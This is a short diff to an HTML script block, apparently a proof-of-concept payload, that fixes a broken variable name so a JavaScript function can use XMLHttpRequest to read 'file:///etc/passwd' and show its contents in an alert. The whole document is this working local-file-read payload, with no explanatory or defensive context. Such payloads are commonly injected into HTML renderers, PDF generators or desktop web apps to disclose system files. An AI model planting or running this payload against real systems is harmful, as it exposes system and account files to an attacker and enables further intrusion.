@@ -1,16 +1,13 @@
 <script> 
-
-	
 function getfile(filepath){
   var request = new XMLHttpRequest();
   request.onreadystatechange = function() {
     var t = new XMLHttpRequest();
     alert(this.responseText);
   };
-  xhttp.open("GET", filepath, false);
-  xhttp.send();
+  request.open("GET", filepath, false);
+  request.send();
 }
 
-getfile("file:///etc/passwd")	
-	
+getfile("file:///etc/passwd");
 </script>
